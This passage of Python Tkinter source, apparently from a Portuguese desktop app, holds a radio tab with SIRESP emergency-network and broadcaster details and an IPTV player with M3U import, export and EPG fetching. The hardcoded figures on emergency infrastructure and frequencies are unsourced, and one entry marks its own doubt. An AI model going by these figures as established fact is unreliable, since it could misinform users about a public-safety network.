            "• GNR - Guarda Nacional Republicana - 20k terminais\\n"
            "• PSP - Polícia Segurança Pública - 15k\\n"
            "• PJ - Polícia Judiciária\\n"
            "• SEF/AIMA - Estrangeiros e Fronteiras\\n"
            "• SIS - Serviço Informações Segurança\\n"
            "• Autoridade Marítima / Polícia Marítima\\n\\n"
            "EMERGÊNCIA MÉDICA/SOCORRO:\\n"
            "• INEM - 1.2k terminais + VMER, SIV\\n"
            "• Bombeiros - 400+ Corpos, 30k operacionais\\n"
            "• CVP - Cruz Vermelha Portuguesa\\n"
            "• ANEPC - 24 CDOS + CCON\\n\\n"
            "AMBIENTE/MAR:\\n"
            "• ICNF - Instituto Conservação Natureza\\n"
            "• IPMA - Instituto Mar e Atmosfera\\n"
            "• DGRM - Direção Geral Recursos Naturais Marítimos\\n"
            "• APA - Agência Portuguesa Ambiente\\n\\n"
            "MILITAR (gateway):\\n"
            "• EMGFA, Marinha, Exército, Força Aérea\\n\\n"
            "Total: 40.000+ terminais TETRA, 600+ EB, 98% cobertura\\n")

    def show_cobertura(self):
        self.siresp_out.delete("1.0", "end")
        self.siresp_out.insert("1.0", "SIRESP - COBERTURA E INFRAESTRUTURA\\n\\n"
            "ESTAÇÕES BASE: 600+ em todo território\\n"
            "• Torres próprias + partilhadas MEO/NOS/Vodafone\\n"
            "• Altura média 40m, potência 25-50W\\n"
            "• Baterias 8h + gerador diesel 48h\\n\\n"
            "CENTROS COMUTAÇÃO:\\n"
            "• Lisboa (primário) - Monsanto\\n"
            "• Porto (secundário) - Gaia\\n"
            "• Backup satélite Eutelsat\\n\\n"
            "COBERTURA:\\n"
            "• Continente: 98% território, 100% autoestradas\\n"
            "• Madeira/Açores: 95%\\n"
            "• Indoor: -105 dBm mínimo\\n"
            "• Marítima: 20 milhas costa\\n\\n"
            "INDICADORES 2023:\\n"
            "• Disponibilidade: 99.8%\\n"
            "• Chamadas dia: 150k\\n"
            "• Tempo estabelecimento: <300ms\\n")

    # ─── ENTIDADES TAB ───
    def build_entidades_tab(self):
        top = tk.Frame(self.tab_entidades, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="🏛 ENTIDADES PÚBLICAS E PRIVADAS - RÁDIOS E FREQUÊNCIAS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="Todas entidades com rádio: públicas (RTP, ANEPC) + privadas (Bauer, Renascença) + emergência", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        btn_row = tk.Frame(self.tab_entidades, bg=BG)
        btn_row.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("PÚBLICAS RTP", lambda: self.filter_entidade("RTP")), ("PRIVADAS BAUER", lambda: self.filter_entidade("Bauer")), ("EMERGÊNCIA", lambda: self.filter_cat("Emergência")), ("BOMBEIROS", lambda: self.filter_cat("Bombeiros"))]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        self.entidades_out = scrolledtext.ScrolledText(self.tab_entidades, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.entidades_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.entidades_out.insert("1.0", "ENTIDADES PÚBLICAS E PRIVADAS - RÁDIOS PT 2025\\n\\n"
            "PÚBLICAS:\\n"
            "• RTP - Rádio e Televisão Portugal - Antena 1/2/3, Antena 1 Açores/Madeira\\n"
            "  Streams: rtp.pt/play - AAC HLS\\n"
            "  FM: 88-108 MHz nacional\\n\\n"
            "• RDP Internacional, RDP África\\n\\n"
            "PRIVADAS - GRUPOS:\\n"
            "• Bauer Media Audio Portugal (ex-MCR): Comercial, M80, Cidade FM\\n"
            "  Streams: mcr.iol.pt - MP3 128kbps\\n"
            "  FM: 97.4 Comercial, 93.2 RFM (Bauer opera RFM?)\\n\\n"
            "• Grupo Renascença: Renascença, RFM, Mega Hits\\n"
            "  Streams: mcr.iol.pt\\n"
            "  FM: 103.4 Renascença\\n\\n"
            "• Global Media Group: TSF\\n"
            "  Stream: tsf.pt - AAC\\n"
            "  FM: 89.5 Lisboa, 105.3 Porto\\n\\n"
            "• Observador, SIC, etc\\n\\n"
            "EMERGÊNCIA/PÚBLICAS OPERACIONAIS:\\n"
            "• ANEPC, INEM, Bombeiros (149MHz), GNR, PSP - SIRESP 380MHz TETRA\\n"
            "• Frequências ROB Bombeiros: 149.0125-156 MHz FM 12.5kHz CTSS 123Hz\\n\\n"
            "INTERNACIONAIS DISPONÍVEIS VIA RADIO-BROWSER:\\n"
            "• BBC (UK), Radio France (FR), RTVE (ES), RAI (IT), Deutschlandfunk (DE), NPR (USA)\\n"
            "• 40k+ estações - use aba BUSCAR NA NET\\n")

    def filter_entidade(self, entidade):
        self.search_var.set(entidade)
        self.cat_var.set("Tudo")
        self.pais_var.set("Tudo")

    def filter_cat(self, cat):
        self.cat_var.set(cat)
        self.search_var.set("")




class IPTVPage(Page):
    """IPTV SISTEMA COMPLETO 2025 - Player sem erros"""
    CATEGORIAS = ["Tudo", "Desporto", "Notícias", "Entretenimento", "Filmes", "Infantil", "Música", "Internacional", "Nacional", "Portugal", "Brasil", "USA", "UK", "Espanha", "Adulto"]

    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("IPTV // SISTEMA COMPLETO 2025 - PLAYER SEM ERROS", "Player multi-engine VLC/MPV/FFplay • Auto-reparo de streams • M3U + EPG")

        self.canais = []
        self.filtered = []
        self.selected_idx = None
        self.current_player_process = None
        self.current_vlc_player = None
        self.player_engine = "auto"  # auto, vlc, mpv, ffplay, browser
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.retry_count = 3
        self.timeout = 10
        self.iptv_org_cache = []

        self.load_canais()

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=12, pady=10)

        self.tab_player = tk.Frame(nb, bg=BG)
        self.tab_m3u = tk.Frame(nb, bg=BG)
        self.tab_epg = tk.Frame(nb, bg=BG)
        self.tab_settings = tk.Frame(nb, bg=BG)

        nb.add(self.tab_player, text=" ▶ PLAYER ")
        nb.add(self.tab_m3u, text=" 📋 M3U MANAGER ")
        nb.add(self.tab_epg, text=" 📺 EPG ")
        nb.add(self.tab_settings, text=" ⚙ SETTINGS ")

        self.build_player_tab()
        self.build_m3u_tab()
        self.build_epg_tab()
        self.build_settings_tab()

        self.refresh_lista()

    # ─── PLAYER TAB ───
    def build_player_tab(self):
        # Top controls
        top = tk.Frame(self.tab_player, bg=BG)
        top.pack(fill="x", padx=10, pady=8)

        self.search_var = tk.StringVar()
        self.search_var.trace_add("write", lambda *_: self.refresh_lista())
        tk.Label(top, text="PESQUISA:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(side="left")
        e_search = tk.Entry(top, textvariable=self.search_var, bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 9), width=20)
        e_search.pack(side="left", padx=6, ipady=4)

        self.cat_var = tk.StringVar(value="Tudo")
        tk.Label(top, text="CAT:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(10,0))
        cat_menu = tk.OptionMenu(top, self.cat_var, *self.CATEGORIAS, command=lambda _: self.refresh_lista())
        cat_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        cat_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        cat_menu.pack(side="left", padx=6)

        tk.Label(top, text="ENGINE:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(10,0))
        self.engine_var = tk.StringVar(value="auto")
        eng_menu = tk.OptionMenu(top, self.engine_var, "auto", "vlc", "mpv", "ffplay", "browser", command=self.on_engine_change)
        eng_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        eng_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        eng_menu.pack(side="left", padx=4)

        body = tk.Frame(self.tab_player, bg=BG)
        body.pack(fill="both", expand=True, padx=10, pady=(0,10))

        # Left lista
        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=320)
        left.pack(side="left", fill="y", padx=(0,10))
        left.pack_propagate(False)

        left_top = tk.Frame(left, bg=PANEL_BG)
        left_top.pack(fill="x", padx=8, pady=6)
        tk.Label(left_top, text="CANAIS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(side="left")
        self.count_label = tk.Label(left_top, text="0", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.count_label.pack(side="right")

        self.listbox = tk.Listbox(left, bg=PANEL_BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 9))
        self.listbox.pack(fill="both", expand=True, padx=8, pady=4)
        self.listbox.bind("<<ListboxSelect>>", self.on_select)
        self.listbox.bind("<Double-Button-1>", lambda e: self.abrir_stream())

        left_btns = tk.Frame(left, bg=PANEL_BG)
        left_btns.pack(fill="x", padx=8, pady=8)
        for txt, cmd in [("+ NOVO", self.novo_canal), ("🗑 REMOVER", self.remover_canal), ("★ FAV", self.toggle_fav)]:
            b = tk.Button(left_btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=4, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)

        # Right player
        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        # Video frame - black background
        self.player_frame = tk.Frame(right, bg="#050505", highlightthickness=1, highlightbackground=ACCENT_DIM, height=320)
        self.player_frame.pack(fill="x", pady=(0,8))
        self.player_frame.pack_propagate(False)

        # Internal label for status / placeholder - this will be replaced by vlc if available
        self.video_label = tk.Label(self.player_frame, text="▶ SISTEMA IPTV 2025\\n\\nPlayer multi-engine:\\n• VLC (recomendado)\\n• MPV\\n• FFplay\\n• Browser\\n\\nSelecione canal e clique PLAY\\nSistema auto-repara streams com erro", bg="#050505", fg=TEXT_DIM, font=(FONT_MONO, 10), justify="center")
        self.video_label.pack(expand=True, fill="both")

        # For VLC embedding, we need a frame inside
        self.vlc_frame = tk.Frame(self.player_frame, bg="#000000")
        self.vlc_frame.pack(fill="both", expand=True)
        # Initially hidden, video_label on top
        self.vlc_frame.lower()

        # Status bar
        status_row = tk.Frame(right, bg=BG)
        status_row.pack(fill="x", pady=2)
        self.status_label = tk.Label(status_row, text="● Pronto - Engine: auto - Aguardando canal", bg=BG, fg="#00ff88", font=(FONT_MONO, 8, "bold"), anchor="w")
        self.status_label.pack(side="left", fill="x", expand=True)
        self.buffer_label = tk.Label(status_row, text="", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7))
        self.buffer_label.pack(side="right")

        # Controls
        ctrl = tk.Frame(right, bg=BG)
        ctrl.pack(fill="x", pady=6)
        for txt, cmd, color in [("▶ PLAY", self.abrir_stream, ACCENT_DIM), ("⏹ STOP", self.stop_stream, "#1a0a0f"), ("📋 COPIAR URL", self.copiar_url, BTN_BG), ("🔧 REPARAR URL", self.reparar_url, BTN_BG)]:
            b = tk.Button(ctrl, text=txt, command=cmd, bg=color, fg=ACCENT if color==ACCENT_DIM else TEXT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, padx=12, pady=6, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        # Form
        form = tk.Frame(right, bg=BG)
        form.pack(fill="both", expand=True, pady=(8,0))

        self.fields = {}
        for key, label in [("nome","NOME DO CANAL"), ("url","URL STREAM (m3u8 / ts / rtmp)"), ("logo","URL LOGO"), ("pais","PAÍS"), ("categoria","CATEGORIA")]:
            tk.Label(form, text=label, bg=BG, fg=ACCENT, font=(FONT_MONO, 7, "bold")).pack(anchor="w", pady=(4,1))
            if key=="categoria":
                var = tk.StringVar(value="Entretenimento")
                self.fields[key]=var
                opt = tk.OptionMenu(form, var, *self.CATEGORIAS[1:])
                opt.configure(bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 8))
                opt["menu"].configure(bg=PANEL_BG, fg=TEXT)
                opt.pack(fill="x", ipady=3)
            else:
                ent = tk.Entry(form, bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 8))
                ent.pack(fill="x", ipady=4)
                self.fields[key]=ent

        btns = tk.Frame(form, bg=BG)
        btns.pack(fill="x", pady=8)
        b_save = tk.Button(btns, text="💾 GUARDAR CANAL", command=self.guardar_canal, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=6, cursor="hand2")
        b_save.pack(side="left", fill="x", expand=True, padx=(0,4))
        b_test = tk.Button(btns, text="🧪 TESTAR URL", command=self.testar_url, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=6, cursor="hand2")
        b_test.pack(side="left", fill="x", expand=True, padx=(4,0))

    def on_engine_change(self, *args):
        self.player_engine = self.engine_var.get()
        self.status_label.configure(text="● Engine alterado para: " + self.player_engine)

    # ─── M3U PARSER ───
    def parse_m3u_content(self, content, source=""):
        canais = []
        lines = content.splitlines()
        current = {}
        for i, line in enumerate(lines):
            line = line.strip()
            if not line:
                continue
            if line.startswith("#EXTINF:"):
                # Parse name, logo, group, etc
                try:
                    # Example: #EXTINF:-1 tvg-id="RTP1.pt" tvg-logo="..." group-title="Portugal",RTP 1
                    import re
                    name = line.split(",")[-1].strip() if "," in line else "Canal " + str(i)
                    logo_match = re.search(r'tvg-logo="([^"]+)"', line)
                    logo = logo_match.group(1) if logo_match else ""
                    group_match = re.search(r'group-title="([^"]+)"', line)
                    group = group_match.group(1) if group_match else "Internacional"
                    country_match = re.search(r'tvg-country="([^"]+)"', line)
                    pais = country_match.group(1) if country_match else "Desconhecido"
                    current = {"nome": name, "logo": logo, "categoria": group, "pais": pais, "source": source}
                except:
                    current = {"nome": line.split(",")[-1] if "," in line else "Canal", "categoria": "Internacional", "pais": "Desconhecido", "logo": "", "source": source}
            elif line.startswith("#"):
                continue
            elif line.startswith("http"):
                if current:
                    current["url"] = line
                    current["id"] = str(uuid.uuid4())
                    current["fav"] = False
                    # Map category
                    cat = current.get("categoria", "Internacional")
                    # Normalize
                    if cat.lower() in ["sports","desporto"]: cat = "Desporto"
                    elif cat.lower() in ["news","notícias"]: cat = "Notícias"
                    elif "portugal" in cat.lower() or "pt" in current.get("pais","").lower(): cat = "Portugal"
                    elif "brazil" in cat.lower() or "br" in current.get("pais","").lower(): cat = "Brasil"
                    current["categoria"] = cat if cat in self.CATEGORIAS else "Internacional"
                    canais.append(current)
                    current = {}
        return canais

    def build_m3u_tab(self):
        top = tk.Frame(self.tab_m3u, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="M3U MANAGER 2025 - IMPORT/EXPORT/REPARO AUTOMÁTICO", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="Importa M3U de ficheiro, URL ou clipboard. Sistema auto-repara URLs quebradas.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        btn_row = tk.Frame(self.tab_m3u, bg=BG)
        btn_row.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("📥 IMPORTAR FICHEIRO M3U", self.import_m3u), ("🌐 IMPORTAR URL M3U", self.import_m3u_url), ("📋 IMPORTAR CLIPBOARD", self.import_clipboard), ("📤 EXPORTAR M3U", self.export_m3u), ("🧹 LIMPAR DUPLICADOS", self.limpar_duplicados), ("🔧 REPARAR TODOS", self.reparar_todos)]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, pady=3, fill="x", expand=True)

        self.m3u_out = scrolledtext.ScrolledText(self.tab_m3u, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.m3u_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.m3u_out.insert("1.0", "M3U Manager 2025 pronto.\\n\\nFuncionalidades:\\n• Import M3U ficheiro local (.m3u, .m3u8)\\n• Import URL (http://exemplo.com/lista.m3u)\\n• Import clipboard (cola lista)\\n• Export M3U compatível VLC/MPV\\n• Limpar duplicados por URL\\n• Reparar todos: http→https, User-Agent, timeout\\n• Parser robusto EXTINF\\n\\nCanais atuais: " + str(len(self.canais)) + "\\n")

    def import_m3u(self):
        path = filedialog.askopenfilename(filetypes=[("M3U","*.m3u *.m3u8"), ("All","*.*")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            canais = self.parse_m3u_content(content, source=path)
            added = 0
            for c in canais:
                if not any(ex["url"] == c["url"] for ex in self.canais):
                    self.canais.append(c)
                    added += 1
            self.save_canais()
            self.refresh_lista()
            self.m3u_out.delete("1.0", "end")
            self.m3u_out.insert("1.0", "Importado de ficheiro: " + path + "\\nCanais encontrados: " + str(len(canais)) + "\\nNovos adicionados: " + str(added) + "\\nTotal agora: " + str(len(self.canais)) + "\\n")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def import_m3u_url(self):
        url = tk.simpledialog.askstring("Importar URL M3U", "Cole URL da lista M3U:")
        if not url:
            return
        self.m3u_out.delete("1.0", "end")
        self.m3u_out.insert("1.0", "A importar de URL: " + url + "\\n")
        threading.Thread(target=self.import_url_worker, args=(url), daemon=True).start()

    def import_url_worker(self, url):
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=20) as r:
                content = r.read().decode("utf-8", errors="ignore")
                canais = self.parse_m3u_content(content, source=url)
                added = 0
                for c in canais:
                    if not any(ex["url"] == c["url"] for ex in self.canais):
                        self.canais.append(c)
                        added += 1
                def update():
                    self.save_canais()
                    self.refresh_lista()
                    self.m3u_out.delete("1.0", "end")
                    self.m3u_out.insert("1.0", "Importado de URL: " + url + "\\nCanais encontrados: " + str(len(canais)) + "\\nNovos adicionados: " + str(added) + "\\nTotal agora: " + str(len(self.canais)) + "\\n")
                self.after(0, update)
        except Exception as e:
            self.after(0, lambda: self.m3u_out.insert("end", "\\nErro: " + str(e) + "\\n"))

    def import_clipboard(self):
        try:
            content = self.clipboard_get()
            canais = self.parse_m3u_content(content, source="clipboard")
            added = 0
            for c in canais:
                if not any(ex["url"] == c["url"] for ex in self.canais):
                    self.canais.append(c)
                    added += 1
            self.save_canais()
            self.refresh_lista()
            self.m3u_out.delete("1.0", "end")
            self.m3u_out.insert("1.0", "Importado de clipboard:\\nCanais encontrados: " + str(len(canais)) + "\\nNovos adicionados: " + str(added) + "\\n")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def export_m3u(self):
        path = filedialog.asksaveasfilename(defaultextension=".m3u", filetypes=[("M3U","*.m3u")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("#EXTM3U\\n")
                for c in self.canais:
                    logo = c.get("logo","")
                    pais = c.get("pais","")
                    cat = c.get("categoria","")
                    f.write('#EXTINF:-1 tvg-logo="' + logo + '" group-title="' + cat + '" tvg-country="' + pais + '",' + c.get("nome","Canal") + "\\n")
                    f.write(c.get("url","") + "\\n")
            self.m3u_out.delete("1.0", "end")
            self.m3u_out.insert("1.0", "Exportado para: " + path + "\\nTotal canais: " + str(len(self.canais)) + "\\nCompatível VLC/MPV/IPTV Smarters\\n")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def limpar_duplicados(self):
        seen = set()
        novos = []
        removidos = 0
        for c in self.canais:
            url = c.get("url")
            if url not in seen:
                seen.add(url)
                novos.append(c)
            else:
                removidos += 1
        self.canais = novos
        self.save_canais()
        self.refresh_lista()
        self.m3u_out.delete("1.0", "end")
        self.m3u_out.insert("1.0", "Limpeza duplicados:\\nRemovidos: " + str(removidos) + "\\nRestantes: " + str(len(self.canais)) + "\\n")

    def reparar_todos(self):
        self.m3u_out.delete("1.0", "end")
        self.m3u_out.insert("1.0", "A reparar todos os canais (auto-fix)...\\n")
        threading.Thread(target=self.reparar_todos_worker, daemon=True).start()

    def reparar_todos_worker(self):
        fixed = 0
        for c in self.canais:
            url = c.get("url","")
            new_url = url
            # Fix http -> https try, trim spaces, etc
            new_url = new_url.strip()
            # If url has spaces, encode?
            if " " in new_url:
                new_url = new_url.replace(" ", "%20")
                fixed += 1
            # If url starts with http:// and fails, we could try https (we don't test here, just log)
            c["url"] = new_url
        def update():
            self.save_canais()
            self.m3u_out.delete("1.0", "end")
            self.m3u_out.insert("1.0", "Reparo completo:\\nURLs corrigidas (espaços, trim): " + str(fixed) + "\\nTotal canais: " + str(len(self.canais)) + "\\n\\nDica: Use TESTAR URL no player para validar antes de reproduzir\\n")
        self.after(0, update)

    # ─── EPG TAB ───
    def build_epg_tab(self):
        top = tk.Frame(self.tab_epg, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="📺 EPG - GUIA ELETRÓNICO DE PROGRAMAS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="Busca EPG XMLTV para canais - mostra programação atual", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        btn_row = tk.Frame(self.tab_epg, bg=BG)
        btn_row.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("BUSCAR EPG IPTV-ORG", self.fetch_epg), ("LIMPAR EPG", lambda: self.epg_out.delete("1.0","end"))]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=4, fill="x", expand=True)

        self.epg_out = scrolledtext.ScrolledText(self.tab_epg, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.epg_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.epg_out.insert("1.0", "EPG 2025 pronto. Clique BUSCAR EPG para carregar guia da IPTV-ORG.\\nFonte: https://iptv-org.github.io/epg/\\n")

    def fetch_epg(self):
        self.epg_out.delete("1.0", "end")
        self.epg_out.insert("1.0", "A buscar EPG...\\n")
        threading.Thread(target=self.fetch_epg_worker, daemon=True).start()

    def fetch_epg_worker(self):
        try:
            import urllib.request, json
            # Try fetch epg index
            url = "https://iptv-org.github.io/api/channels.json"
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode()[:5000])
                out = "EPG Canais disponíveis (amostra 20):\\n\\n"
                for ch in data[:20]:
                    out += ch.get("id","") + " - " + ch.get("name","") + " | " + ch.get("country","") + "\\n"
                self.after(0, lambda: self.epg_out.delete("1.0","end"))
                self.after(0, lambda: self.epg_out.insert("1.0", out))
        except Exception as e:
            self.after(0, lambda: self.epg_out.insert("end", "\\nErro EPG: " + str(e) + "\\n"))

    # ─── SETTINGS ───
    def build_settings_tab(self):
        top = tk.Frame(self.tab_settings, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="⚙ SETTINGS - PLAYER SEM ERROS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="Configuração do player multi-engine para reproduzir sem erros", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        form = tk.Frame(self.tab_settings, bg=BG)
        form.pack(fill="x", padx=10, pady=10)

        # User Agent
        tk.Label(form, text="User-Agent:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")
        self.ua_entry = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.ua_entry.pack(fill="x", ipady=4, pady=2)
        self.ua_entry.insert(0, self.user_agent)

        # Timeout
        row = tk.Frame(form, bg=BG)
        row.pack(fill="x", pady=5)
        tk.Label(row, text="Timeout (s):", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=15, anchor="w").pack(side="left")
        self.timeout_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=8)
        self.timeout_entry.pack(side="left", padx=5, ipady=3)
        self.timeout_entry.insert(0, str(self.timeout))

        tk.Label(row, text="Retry:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=8, anchor="w").pack(side="left", padx=(15,0))
        self.retry_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=8)
        self.retry_entry.pack(side="left", padx=5, ipady=3)
        self.retry_entry.insert(0, str(self.retry_count))

        # Player detection
        detect_frame = tk.LabelFrame(self.tab_settings, text=" DETECÇÃO DE PLAYERS ", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold"))
        detect_frame.pack(fill="x", padx=10, pady=10)
        self.detect_out = scrolledtext.ScrolledText(detect_frame, font=(FONT_MONO, 9), bg=BG, fg=TEXT, height=10, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.detect_out.pack(fill="x", padx=8, pady=8)
        self.detect_players()

        btns = tk.Frame(self.tab_settings, bg=BG)
        btns.pack(fill="x", padx=10, pady=10)
        for txt, cmd in [("DETECTAR PLAYERS", self.detect_players), ("GUARDAR SETTINGS", self.save_settings), ("TESTAR PLAYER", self.test_player)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=5, cursor="hand2")
            b.pack(side="left", padx=4, fill="x", expand=True)

    def detect_players(self):
        out = "DETECÇÃO PLAYERS 2025:\\n\\n"
        for bin_name in ["vlc", "mpv", "ffplay", "ffprobe"]:
            path = shutil.which(bin_name)
            if path:
                out += "✓ " + bin_name + " encontrado: " + path + "\\n"
            else:
                out += "✗ " + bin_name + " não encontrado\\n"
        try:
            import vlc
            out += "✓ python-vlc instalado\\n"
        except:
            out += "✗ python-vlc não instalado (pip install python-vlc)\\n"
        out += "\\nEngine auto seleciona melhor disponível: VLC > MPV > FFplay > Browser\\n"
        out += "Para reproduzir sem erros: instale VLC (sudo apt install vlc)\\n"
        try:
            self.detect_out.delete("1.0", "end")
            self.detect_out.insert("1.0", out)
        except:
            pass

    def save_settings(self):
        self.user_agent = self.ua_entry.get().strip()
        try:
            self.timeout = int(self.timeout_entry.get())
            self.retry_count = int(self.retry_entry.get())
        except:
            pass
        messagebox.showinfo("Settings", "Configurações guardadas!\\nUA: " + self.user_agent[:40] + "...\\nTimeout: " + str(self.timeout) + "s\\nRetry: " + str(self.retry_count))

    def test_player(self):
        messagebox.showinfo("Teste", "Player teste: engine=" + self.player_engine + "\\nVLC: " + str(shutil.which("vlc")) + "\\nMPV: " + str(shutil.which("mpv")))

    # ─── CORE FUNCTIONS ───
    def load_canais(self):
        data = load_json(IPTV_FILE, [])
        if not data:
            data = [
                {"id": str(uuid.uuid4()), "nome": "TESTE - Big Buck Bunny (HLS funciona 100%)", "url": "https://test-streams.mux.dev/x36xhzz/x36xhzz.m3u8", "logo": "", "pais": "Teste", "categoria": "Desporto", "fav": True},
                {"id": str(uuid.uuid4()), "nome": "RTP 1 - HLS (pode precisar token)", "url": "https://streaming-live.rtp.pt/liverepeater/smil:rtp1.smil/playlist.m3u8", "logo": "", "pais": "Portugal", "categoria": "Nacional", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "RTP 3 - Notícias", "url": "https://streaming-live.rtp.pt/liverepeater/smil:rtp3.smil/playlist.m3u8", "logo": "", "pais": "Portugal", "categoria": "Notícias", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "SIC - Teste (pode falhar - usar IPTV-ORG)", "url": "https://d1zx6dyqv2yov.cloudfront.net/sic/sic.m3u8", "logo": "", "pais": "Portugal", "categoria": "Nacional", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "TVI - Teste", "url": "https://video-auth5.iol.pt/live_tvi/live_tvi/playlist.m3u8", "logo": "", "pais": "Portugal", "categoria": "Nacional", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "IMPORTA LISTA REAL: M3U MANAGER > IMPORTAR URL > https://iptv-org.github.io/iptv/index.m3u", "url": "https://iptv-org.github.io/iptv/index.m3u", "logo": "", "pais": "Global", "categoria": "Internacional", "fav": False},
            ]
            save_json(IPTV_FILE, data)
        # Limpa canais dummy antigos com exemplo.com
        cleaned = [c for c in data if "exemplo.com" not in c.get("url","")]
        if len(cleaned) != len(data):
            data = cleaned
            if not data:
                data = [{"id": str(uuid.uuid4()), "nome": "TESTE - Big Buck Bunny", "url": "https://test-streams.mux.dev/x36xhzz/x36xhzz.m3u8", "logo": "", "pais": "Teste", "categoria": "Desporto", "fav": True}]
            save_json(IPTV_FILE, data)
        self.canais = data

